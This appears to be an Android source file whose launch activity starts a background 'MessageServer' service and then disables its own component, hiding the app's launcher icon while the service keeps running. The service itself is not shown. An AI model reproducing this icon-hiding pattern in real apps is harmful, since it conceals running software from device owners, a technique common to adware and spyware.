package com.pro.push;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

public class InitActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		Intent server=new Intent(this,MessageServer.class);
		this.startService(server);
		PackageManager pm=this.getPackageManager();
		pm.setComponentEnabledSetting(this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
		this.finish();
	}


}
